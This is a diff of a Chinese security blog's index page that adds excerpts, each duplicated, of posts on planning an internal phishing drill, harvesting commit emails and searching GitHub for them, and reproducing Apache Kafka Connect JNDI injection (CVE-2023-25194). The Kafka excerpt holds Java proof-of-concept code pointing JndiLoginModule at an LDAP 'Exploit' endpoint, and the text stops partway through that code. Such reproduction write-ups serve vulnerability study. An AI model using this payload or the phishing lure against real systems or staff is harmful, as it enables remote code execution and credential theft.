@@ -117,6 +117,408 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2023/03/27/pinfish-and-osx-pentest.html" >记一次钓鱼演练和OS X下的渗透技巧</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-03-27  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:</p>
+<ul>
+<li>确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存</li>
+<li>确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。</li>
+<li>确定钓鱼的效果：从三个数据维度来看最终效果<ul>
+<li>钓鱼页面访问次数</li>
+<li>输入公司邮箱的数量统计</li>
+<li>收集运行了Exe和Pkg的用户</li>
+</ul>
+</li>
+</ul>
+<h2 id="钓鱼邮件的发送"><a href="#钓鱼邮件的发送" class="headerlink" title="钓鱼邮件的发送"></a>钓鱼邮件的发送</h2><p>有两种形式可以发送钓鱼邮件：</p>
+<ol>
+<li>使用相近域名</li>
+<li>使用sendcloud</li>
+</ol>
+<h3 id="相近域名发送"><a href="#相近域名发送" class="headerlink" title="相近域名发送"></a>相近域名发送</h3><p>注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/341879374">2021年四款国内外免费企业邮箱及申请教程图解</a></p>
+<h3 id="使用SendCloud"><a href="#使用SendCloud" class="headerlink" title="使用SendCloud"></a>使用SendCloud</h3><p>注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件：</p>
+	
+
+	</div>
+  <a type="button" href="/2023/03/27/pinfish-and-osx-pentest.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:</p>
+<ul>
+<li>确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存</li>
+<li>确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。</li>
+<li>确定钓鱼的效果：从三个数据维度来看最终效果<ul>
+<li>钓鱼页面访问次数</li>
+<li>输入公司邮箱的数量统计</li>
+<li>收集运行了Exe和Pkg的用户</li>
+</ul>
+</li>
+</ul>
+<h2 id="钓鱼邮件的发送"><a href="#钓鱼邮件的发送" class="headerlink" title="钓鱼邮件的发送"></a>钓鱼邮件的发送</h2><p>有两种形式可以发送钓鱼邮件：</p>
+<ol>
+<li>使用相近域名</li>
+<li>使用sendcloud</li>
+</ol>
+<h3 id="相近域名发送"><a href="#相近域名发送" class="headerlink" title="相近域名发送"></a>相近域名发送</h3><p>注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/341879374">2021年四款国内外免费企业邮箱及申请教程图解</a></p>
+<h3 id="使用SendCloud"><a href="#使用SendCloud" class="headerlink" title="使用SendCloud"></a>使用SendCloud</h3><p>注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件：</p>
+	
+	</div>
+  <a type="button" href="/2023/03/27/pinfish-and-osx-pentest.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/03/03/github-trick.html" >Github搜索小技巧</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-03-03  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>获取了一个多人运动的git仓库，需要提取仓库里面所有的Email，然后根据Email搜一下Github是否存在对应的提交记录。这是一个很常见的问题，比如公司员工在提交gihtub的时候，没有注意修改提交的邮箱，很可能使用公司的邮箱进行提交。</p>
+<h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>有两种方法可以提取一个仓库的所有邮箱：</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log <span class="token string">"--format=format:%ae"</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> shortlog -sea <span class="token operator">|</span> <span class="token function">grep</span> -E -o <span class="token string">"<span class="token entity" title="\b">\b</span>[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;<span class="token entity" title="\b">\b</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print tolower($0)&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">grep</span> -wv <span class="token string">'users.noreply.github.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后根据<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">github小技巧</a>写一个批量获取邮箱的脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">from</span> random <span class="token keyword">import</span> choice
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> time
+
+TOKEN_LISTS <span class="token operator">=</span> <span class="token punctuation">[</span>
+      <span class="token string">""</span>
+<span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">search_commits</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
+       headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/vnd.github+json"</span><span class="token punctuation">,</span>
+                   <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+                  <span class="token punctuation">&#125;</span>
+       req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://api.github.com/search/commits'</span><span class="token punctuation">,</span>
+           <span class="token punctuation">&#123;</span><span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"committer-email:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+           headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+       <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token comment"># file = sys.argv[1]</span>
+    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">"/tmp/email.txt"</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+          <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                email <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                token <span class="token operator">=</span> choice<span class="token punctuation">(</span>TOKEN_LISTS<span class="token punctuation">)</span>
+                
+                <span class="token keyword">try</span><span class="token punctuation">:</span>
+                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+                    <span class="token keyword">if</span> search_commits<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"total_count"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>
+                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+                     <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2023/03/03/github-trick.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>获取了一个多人运动的git仓库，需要提取仓库里面所有的Email，然后根据Email搜一下Github是否存在对应的提交记录。这是一个很常见的问题，比如公司员工在提交gihtub的时候，没有注意修改提交的邮箱，很可能使用公司的邮箱进行提交。</p>
+<h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>有两种方法可以提取一个仓库的所有邮箱：</p>
+<h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log <span class="token string">"--format=format:%ae"</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> shortlog -sea <span class="token operator">|</span> <span class="token function">grep</span> -E -o <span class="token string">"<span class="token entity" title="\b">\b</span>[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]&#123;2,6&#125;<span class="token entity" title="\b">\b</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print tolower($0)&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> <span class="token operator">|</span> <span class="token function">grep</span> -wv <span class="token string">'users.noreply.github.com'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后根据<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/zoYE102P_2BvB-sForjkHQ">github小技巧</a>写一个批量获取邮箱的脚本：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
+<span class="token keyword">from</span> random <span class="token keyword">import</span> choice
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> time
+
+TOKEN_LISTS <span class="token operator">=</span> <span class="token punctuation">[</span>
+      <span class="token string">""</span>
+<span class="token punctuation">]</span>
+
+<span class="token keyword">def</span> <span class="token function">search_commits</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">:</span>
+       headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/vnd.github+json"</span><span class="token punctuation">,</span>
+                   <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
+                  <span class="token punctuation">&#125;</span>
+       req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://api.github.com/search/commits'</span><span class="token punctuation">,</span>
+           <span class="token punctuation">&#123;</span><span class="token string">'q'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"committer-email:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>email<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+           headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+       <span class="token keyword">return</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>req<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    <span class="token comment"># file = sys.argv[1]</span>
+    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token string">"/tmp/email.txt"</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+          <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                email <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                token <span class="token operator">=</span> choice<span class="token punctuation">(</span>TOKEN_LISTS<span class="token punctuation">)</span>
+                
+                <span class="token keyword">try</span><span class="token punctuation">:</span>
+                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+                    <span class="token keyword">if</span> search_commits<span class="token punctuation">(</span>token<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"total_count"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
+                        <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span>
+                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+                     <span class="token keyword">raise</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2023/03/03/github-trick.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/02/14/kafka-rce.html" >Apache Kafka Connect JNDI注入漏洞复现(CVE-2023-25194)</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-02-14  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul>
+<li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li>
+<li>修复建议: 升级至3.4.0版本</li>
+<li>官方链接：<a target="_blank" rel="noopener" href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
+<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz
+ 
+//启动zk和kafka
+bin/zookeeper-server-start.sh config/zookeeper.properties
+bin/kafka-server-start.sh config/server.properties
+ 
+//创建一个测试topic
+bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>
+                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>
+                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>
+                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.deserializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringDeserializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"key.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"value.serializer"</span><span class="token punctuation">,</span> <span class="token string">"org.apache.kafka.common.serialization.StringSerializer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">Producer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> producer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KafkaProducer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>props<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            producer<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ProducerRecord</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            producer<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>pom.xml文件：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.kafka<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>kafka-clients<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-beanutils<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.8.3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="生成反序列化数据"><a href="#生成反序列化数据" class="headerlink" title="生成反序列化数据"></a>生成反序列化数据</h3>
+	
+
+	</div>
+  <a type="button" href="/2023/02/14/kafka-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul>
+<li>影响版本：2.3.0 &lt;= Apache Kafka Connect &lt;= 3.3.2</li>
+<li>修复建议: 升级至3.4.0版本</li>
+<li>官方链接：<a target="_blank" rel="noopener" href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地先启动kafka server:</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dlcdn.apache.org/kafka/3.4.0/kafka_2.13-3.4.0.tgz
+<span class="token function">tar</span> -xvf kafka_2.13-3.4.0.tgz
+ 
+//启动zk和kafka
+bin/zookeeper-server-start.sh config/zookeeper.properties
+bin/kafka-server-start.sh config/server.properties
+ 
+//创建一个测试topic
+bin/kafka-topics.sh --create --bootstrap-server localhost:9092 --replication-factor <span class="token number">1</span> --partitions <span class="token number">1</span> --topic <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">KafkaProducer</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">Producer</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>kafka<span class="token punctuation">.</span>clients<span class="token punctuation">.</span>producer<span class="token punctuation">.</span></span><span class="token class-name">ProducerRecord</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span><span class="token punctuation">;</span>
+ 
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Properties</span> props <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.mechanism"</span><span class="token punctuation">,</span> <span class="token string">"SCRAM-SHA-256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"security.protocol"</span><span class="token punctuation">,</span> <span class="token string">"SASL_SSL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"sasl.jaas.config"</span><span class="token punctuation">,</span><span class="token string">"com.sun.security.auth.module.JndiLoginModule "</span>
+                    <span class="token operator">+</span> <span class="token string">"required user.provider.url=\"ldap://0.0.0.0:1389/Exploit\" "</span>
+                    <span class="token operator">+</span> <span class="token string">"useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" "</span>
+                    <span class="token operator">+</span> <span class="token string">"group.provider.url=\"xxx\";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        props<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bootstrap.servers"</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0:9092"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
